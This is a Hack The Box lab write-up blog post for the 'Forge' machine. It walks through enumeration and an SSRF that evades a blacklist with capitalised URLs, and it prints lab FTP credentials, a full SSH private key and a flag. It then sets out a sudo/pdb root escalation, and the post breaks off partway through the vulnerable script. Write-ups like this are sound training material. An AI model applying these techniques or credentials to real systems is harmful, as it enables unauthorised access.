<!DOCTYPE html> <html lang="en-US"> <head prefix="og: http://ogp.me/ns#"> <meta charset="UTF-8" /> <meta http-equiv="X-UA-Compatible" content="ie=edge" /> <meta name="viewport" content="width=device-width, initial-scale=1.0" /> <meta name="mobile-web-app-capable" content="yes" /> <meta name="apple-mobile-web-app-capable" content="yes" /> <meta name="application-name" content="blog @ zexion.dev" /> <meta name="apple-mobile-web-app-status-bar-style" content="#fff" /> <meta name="apple-mobile-web-app-title" content="blog @ zexion.dev" /> <title> Forge - Hack The Box - blog @ zexion.dev </title> <link rel="alternate" href="http://localhost:4000/Forge/" hreflang="en-US" /> <link rel="canonical" href="http://localhost:4000/Forge/" /> <meta name="description" content="An medium rated machine from Hack The Box" /> <meta name="referrer" content="no-referrer-when-downgrade" /> <meta property="fb:app_id" content="" /> <meta property="og:site_name" content="Forge - Hack The Box | zexionx00" /> <meta property="og:title" content="Forge - Hack The Box | zexionx00" /> <meta property="og:type" content="website" /> <meta property="og:url" content="http://localhost:4000/Forge/" /> <meta property="og:description" content="An medium rated machine from Hack The Box" /> <meta property="og:image" content="http://localhost:4000/assets/img/zexion.jpg" /> <meta property="og:image:width" content="640" /> <meta property="og:image:height" content="640" /> <meta name="twitter:card" content="summary" /> <meta name="twitter:title" content="Forge - Hack The Box | zexionx00" /> <meta name="twitter:url" content="http://localhost:4000/Forge/" /> <meta name="twitter:site" content="@zexionx00" /> <meta name="twitter:creator" content="@zexionx00" /> <meta name="twitter:description" content="An medium rated machine from Hack The Box" /> <meta name="twitter:image" content="http://localhost:4000/assets/img/zexion.jpg" /> <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="blog @ zexion.dev" /> <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicons/apple-touch-icon.png" /> <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicons/favicon-32x32.png" /> <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicons/favicon-16x16.png" /> <link rel="manifest" href="/assets/favicons/site.webmanifest" /> <link rel="mask-icon" href="/assets/favicons/safari-pinned-tab.svg" color="#5bbad5" /> <meta name="apple-mobile-web-app-title" content="Jekyll Klise" /> <meta name="application-name" content="Jekyll Klise" /> <meta name="msapplication-TileColor" content="#da532c" /> <meta name="theme-color" content="#2c2c2c" /> <link rel="stylesheet" href="/assets/css/style.css" /> </head> <body data-theme="dark" class="notransition"> <script> const body = document.body; const data = body.getAttribute("data-theme"); const initTheme = (state) => { if (state === "dark") { body.setAttribute("data-theme", "dark"); } else if (state === "light") { body.removeAttribute("data-theme"); } else { localStorage.setItem("theme", data); } }; initTheme(localStorage.getItem("theme")); setTimeout(() => body.classList.remove("notransition"), 75); </script> <div class="navbar" role="navigation"> <nav class="menu"> <input type="checkbox" id="menu-trigger" class="menu-trigger" /> <label for="menu-trigger"> <span class="menu-icon"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <path d="M64,384H448V341.33H64Zm0-106.67H448V234.67H64ZM64,128v42.67H448V128Z" /> </svg> </span> </label> <a id="mode"> <svg class="mode-sunny" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <title>LIGHT</title> <line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> </svg> <svg class="mode-moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <title>DARK</title> <line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> </svg> </a> <div class="trigger"> <div class="trigger-container"><a class="menu-link" href="/">home</a><a class="menu-link" href="/archive/">archive</a><a class="menu-link" href="/about/">about</a><a class="menu-link rss" href="/feed.xml"> <svg xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 512 512" fill="#ED812E" > <title>RSS</title> <path d="M108.56,342.78a60.34,60.34,0,1,0,60.56,60.44A60.63,60.63,0,0,0,108.56,342.78Z" /> <path d="M48,186.67v86.55c52,0,101.94,15.39,138.67,52.11s52,86.56,52,138.67h86.66C325.33,312.44,199.67,186.67,48,186.67Z" /> <path d="M48,48v86.56c185.25,0,329.22,144.08,329.22,329.44H464C464,234.66,277.67,48,48,48Z" /> </svg> </a> </div> </div> </nav> </div> <div class="wrapper post"> <main class="page-content" aria-label="Content"> <article itemscope itemtype="https://schema.org/BlogPosting"> <header class="header"> <div class="tags"> <span itemprop="keywords"> <a class="tag" href="/tags/#htb">HTB</a> </span> </div> <h1 class="header-title" itemprop="headline">Forge - Hack The Box</h1> <div class="post-meta"> <time datetime="2021-09-12T01:00:07+01:00" itemprop="datePublished"> Sep 12, 2021 </time> <span itemprop="author" itemscope itemtype="https://schema.org/Person"> <span itemprop="name">zexionx00</span> </span> <time hidden datetime="" itemprop="dateModified"> Sep 12, 2021 </time> <span hidden itemprop="publisher" itemtype="Person">zexionx00</span> <span hidden itemprop="image"></span> <span hidden itemprop="mainEntityOfPage"><figure> <img src="/assets/img/forge/forge.png" alt="forge" /> <figcaption> Forge - Hack The Box </figcaption> </figure> </span> </div> </header> <div class="page-content" itemprop="articleBody"> <figure> <img src="/assets/img/forge/forge.png" alt="forge" /> <figcaption> Forge - Hack The Box </figcaption> </figure> <h1 id="introduction"> <a href="#introduction" class="anchor-head"></a> Introduction </h1> <p><a href="https://www.hackthebox.com/home/machines/profile/376" target="_blank" rel="noopener nofollow">Forge</a> is medium rated machine from Hack The Box, which includes SSRF to get ftp credentials from internal server, for root we use pdb abuse to get a root shell.</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># Nmap 7.91 scan initiated Sun Jan 30 01:12:21 2022 as: nmap -sC -sV -vv -oA nmap/ports 10.10.11.111</span>
Nmap scan report <span class="k">for </span>10.10.11.111
Host is up, received echo-reply ttl 63 <span class="o">(</span>0.35s latency<span class="o">)</span><span class="nb">.</span>
Scanned at 2022-01-30 01:12:22 EST <span class="k">for </span>33s
Not shown: 997 closed ports
Reason: 997 resets
PORT   STATE    SERVICE REASON         VERSION
21/tcp filtered ftp     no-response
22/tcp open     ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac <span class="o">(</span>RSA<span class="o">)</span>
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2sK9Bs3bKpmIER8QElFzWVwM0V/pval09g7BOCYMOZihHpPeE4S2aCt0oe9/KHyALDgtRb3++WLuaI6tdYA1k4bhZU/0bPENKBp6ykWUsWieSSarmd0sfekrbcqob69pUJSxIVzLrzXbg4CWnnLh/UMLc3emGkXxjLOkR1APIZff3lXIDr8j2U3vDAwgbQINDinJaFTjDcXkOY57u4s2Si4XjJZnQVXuf8jGZxyyMKY/L/RYxRiZVhDGzEzEBxyLTgr5rHi3RF+mOtzn3s5oJvVSIZlh15h2qoJX1v7N/N5/7L1RR9rV3HZzDT+reKtdgUHEAKXRdfrff04hXy6aepQm+kb4zOJRiuzZSw6ml/N0ITJy/L6a88PJflpctPU4XKmVX5KxMasRKlRM4AMfzrcJaLgYYo1bVC9Ik+cCt7UjtvIwNZUcNMzFhxWFYFPhGVJ4HC0Cs2AuUC8T0LisZfysm61pLRUGP7ScPo5IJhwlMxncYgFzDrFRig3DlFQ0<span class="o">=</span>
|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 <span class="o">(</span>ECDSA<span class="o">)</span>
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH67/BaxpvT3XsefC62xfP5fvtcKxG2J2di6u8wupaiDIPxABb5/S1qecyoQJYGGJJOHyKlVdqgF1Odf2hAA69Y<span class="o">=</span>
|   256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 <span class="o">(</span>ED25519<span class="o">)</span>
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILcTSbyCdqkw29aShdKmVhnudyA2B6g6ULjspAQpHLIC
80/tcp open     http    syn-ack ttl 63 Apache httpd 2.4.41
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Did not follow redirect to http://forge.htb
Service Info: Host: 10.10.11.111<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Sun Jan 30 01:12:55 2022 -- 1 IP address (1 host up) scanned in 34.18 seconds</span></code></pre></figure> <h1 id="subdomain"> <a href="#subdomain" class="anchor-head"></a> SubDomain </h1> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">ffuf <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt <span class="nt">-u</span> http://forge.htb <span class="nt">-H</span> <span class="s1">'Host: FUZZ.forge.htb'</span> <span class="nt">--fl</span> 10

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive &lt;3
________________________________________________

 :: Method           : GET
 :: URL              : http://forge.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Header           : Host: FUZZ.forge.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response lines: 10
________________________________________________

ADMIN                   [Status: 200, Size: 27, Words: 4, Lines: 2]
admin                   [Status: 200, Size: 27, Words: 4, Lines: 2]
Admin                   [Status: 200, Size: 27, Words: 4, Lines: 2]
:: Progress: [4614/4614] :: Job [1/1] :: 116 req/sec :: Duration: [0:00:44] :: Errors: 0 ::</span></code></pre></figure> <h1 id="web"> <a href="#web" class="anchor-head"></a> Web </h1> <p>We get /upload page where we can upload local file and upload from url. When trying to upload php cmdshell or php reverse shell, we don’t get any hit. So, when trying to upload from url and give our IP, we indeed get a hit.</p> <figure> <img src="/assets/img/forge/up.png" alt="upload" /> <figcaption> Upload </figcaption> </figure> <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">sudo </span>nc <span class="nt">-lnvp</span> 80
listening on <span class="o">[</span>any] 80 ...
connect to <span class="o">[</span>10.10.14.54] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.111] 38900
GET / HTTP/1.1
Host: 10.10.14.54
User-Agent: python-requests/2.25.1
Accept-Encoding: <span class="nb">gzip</span>, deflate
Accept: <span class="k">*</span>/<span class="k">*</span>
Connection: keep-alive</code></pre></figure> <h1 id="adminforgehtb"> <a href="#adminforgehtb" class="anchor-head"></a> Admin.forge.htb </h1> <p>We got a new subdomain admin.forge.htb, but we get only localhost allowed. But we have SSRF, upload from url but now we get blacklisted address.</p> <figure> <img src="/assets/img/forge/black.png" alt="Black" /> <figcaption> BlackListed </figcaption> </figure> <h1 id="bypass"> <a href="#bypass" class="anchor-head"></a> Bypass </h1> <p>So, what we can do to bypass is just give the url with all CAPS, and we indeed get page back.</p> <figure> <img src="/assets/img/forge/cap.png" alt="Bypass" /> <figcaption> Capital Bypass </figcaption> </figure> <figure class="highlight"><pre><code class="language-html" data-lang="html">% curl http://forge.htb/uploads/8RUPPDxDkIhklsiZXCAd
<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;title&gt;</span>Admin Portal<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="na">href=</span><span class="s">"/static/css/main.css"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;header&gt;</span>
            <span class="nt">&lt;nav&gt;</span>
                <span class="nt">&lt;h1</span> <span class="na">class=</span><span class="s">""</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/"</span><span class="nt">&gt;</span>Portal home<span class="nt">&lt;/a&gt;&lt;/h1&gt;</span>
                <span class="nt">&lt;h1</span> <span class="na">class=</span><span class="s">"align-right margin-right"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/announcements"</span><span class="nt">&gt;</span>Announcements<span class="nt">&lt;/a&gt;&lt;/h1&gt;</span>
                <span class="nt">&lt;h1</span> <span class="na">class=</span><span class="s">"align-right"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/upload"</span><span class="nt">&gt;</span>Upload image<span class="nt">&lt;/a&gt;&lt;/h1&gt;</span>
            <span class="nt">&lt;/nav&gt;</span>
    <span class="nt">&lt;/header&gt;</span>
    <span class="nt">&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span>
    <span class="nt">&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span>
    <span class="nt">&lt;center&gt;&lt;h1&gt;</span>Welcome Admins!<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure> <p>There is a page called /announcements, so let’s try to visit there.</p> <figure class="highlight"><pre><code class="language-html" data-lang="html">% curl http://forge.htb/uploads/aIUpLGjET5IfWYH4yTYt
<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;title&gt;</span>Announcements<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="na">href=</span><span class="s">"/static/css/main.css"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="na">href=</span><span class="s">"/static/css/announcements.css"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;header&gt;</span>
            <span class="nt">&lt;nav&gt;</span>
                <span class="nt">&lt;h1</span> <span class="na">class=</span><span class="s">""</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/"</span><span class="nt">&gt;</span>Portal home<span class="nt">&lt;/a&gt;&lt;/h1&gt;</span>
                <span class="nt">&lt;h1</span> <span class="na">class=</span><span class="s">"align-right margin-right"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/announcements"</span><span class="nt">&gt;</span>Announcements<span class="nt">&lt;/a&gt;&lt;/h1&gt;</span>
                <span class="nt">&lt;h1</span> <span class="na">class=</span><span class="s">"align-right"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/upload"</span><span class="nt">&gt;</span>Upload image<span class="nt">&lt;/a&gt;&lt;/h1&gt;</span>
            <span class="nt">&lt;/nav&gt;</span>
    <span class="nt">&lt;/header&gt;</span>
    <span class="nt">&lt;br&gt;&lt;br&gt;&lt;br&gt;</span>
    <span class="nt">&lt;ul&gt;</span>
        <span class="nt">&lt;li&gt;</span>An internal ftp server has been setup with credentials as user:heightofsecurity123!<span class="nt">&lt;/li&gt;</span>
        <span class="nt">&lt;li&gt;</span>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.<span class="nt">&lt;/li&gt;</span>
        <span class="nt">&lt;li&gt;</span>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=<span class="ni">&amp;lt;</span>url<span class="ni">&amp;gt;</span>.<span class="nt">&lt;/li&gt;</span>
    <span class="nt">&lt;/ul&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure> <p>We get credential there and also it says how to access it. So, let’s do it.</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">% curl http://forge.htb/uploads/c8bsS3FN7jn4TmgjJIXR
drwxr-xr-x    3 1000     1000         4096 Aug 04 19:23 snap
<span class="nt">-rw-r-----</span>    1 0        1000           33 Jan 29 06:07 user.txt</code></pre></figure> <p>This looks like a directory listing of user’s directory. So, let’s grab the id_rsa of user.</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">% curl http://forge.htb/uploads/0XyXpVJum9WSu3tm1WEk
<span class="nt">-----BEGIN</span> OPENSSH PRIVATE KEY-----
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
<span class="nv">shlLupso7WoS0AAAAKdXNlckBmb3JnZQE</span><span class="o">=</span>
<span class="nt">-----END</span> OPENSSH PRIVATE KEY-----</code></pre></figure> <p>And we can get in the system as user. If you are confused how I got the username, just get /etc/passwd. You’ll get in there.</p> <h1 id="ssh"> <a href="#ssh" class="anchor-head"></a> SSH </h1> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">% ssh <span class="nt">-i</span> id_rsa user@forge.htb 
The authenticity of host <span class="s1">'forge.htb (10.10.11.111)'</span> can<span class="s1">'t be established.
ECDSA key fingerprint is SHA256:e/qp97tB7zm4r/sMgxwxPixH0d4YFnuB6uKn1GP5GTw.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>forge.htb,10.10.11.111<span class="s1">' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 30 Jan 2022 06:44:24 AM UTC

  System load:  0.0               Processes:             223
  Usage of /:   44.4% of 6.82GB   Users logged in:       0
  Memory usage: 26%               IPv4 address for eth0: 10.10.11.111
  Swap usage:   0%


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Jan 30 06:20:04 2022 from 10.10.16.3
user@forge:~$ ls
snap  user.txt
user@forge:~$ cat user.txt 
d47acefe482af3ea8f484f728110f5b3
user@forge:~$ </span></code></pre></figure> <h1 id="root"> <a href="#root" class="anchor-head"></a> Root </h1> <p>The basic sudo -l reveals /opt/remote-manage.py can run as root without password. Checking the python script, we see that if there is Exception, the pdb is set. So, let’s break the script while running, and get into pdb session.</p> <figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/env python3
</span><span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">subprocess</span>
<span class="kn">import</span> <span class="nn">pdb</span>

<span class="n">port</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1025</span><span class="p">,</span> <span class="mi">65535</span><span class="p">)</span>

<span class="k">try</span><span class="p">:</span>
    <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">sock</span><span class="p">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="n">sock</span><span class="p">.</span><span class="n">bind</span><span class="p">((</span><span class="s">'127.0.0.1'</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    <span class="n">sock</span><span class="p">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'Listening on localhost:</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
    <span class="p">(</span><span class="n">clientsock</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span> <span class="o">=</span> <span class="n">sock</span><span class="p">.</span><span class="n">accept</span><span class="p">()</span>
    <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'Enter the secret passsword: '</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">clientsock</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">).</span><span class="n">strip</span><span class="p">().</span><span class="n">decode</span><span class="p">()</span> <span class="o">!=</span> <span class="s">'secretadminpassword'</span><span class="p">:</span>
        <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'Wrong password!</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'Welcome admin!</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
            <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">What do you wanna do: </span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
            <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'[1] View processes</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
            <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'[2] View free memory</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
            <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'[3] View listening sockets</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
            <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'[4] Quit</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
            <span class="n">option</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">clientsock</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">).</span><span class="n">strip</span><span class="p">())</span>
            <span class="k">if</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
